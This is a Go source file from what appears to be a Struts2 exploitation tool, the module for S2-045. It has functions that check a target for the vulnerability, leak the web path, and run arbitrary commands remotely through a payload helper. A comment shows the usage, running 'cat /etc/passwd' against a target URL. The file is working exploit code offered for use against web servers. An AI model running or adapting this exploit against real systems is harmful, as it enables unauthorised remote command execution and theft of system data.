package s045

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
	"log"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-045/orders --vn 45 --mode exec --cmd "cat /etc/passwd"
*/

func Check(targetUrl string) {
	respString := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.PocS045Check)
	if utils.IfContainsStr(respString, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-045！"))
	} else {
		log.Printf("%s Struts2-045 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func GetWebPath(targetUrl string) {
	webPath := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.PocS045WebPath)
	color.Green(webPath)

}

func ExecCommand(targetUrl string, command string) {
	respString := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.PocS045Exec(command))
	fmt.Println(respString)
}
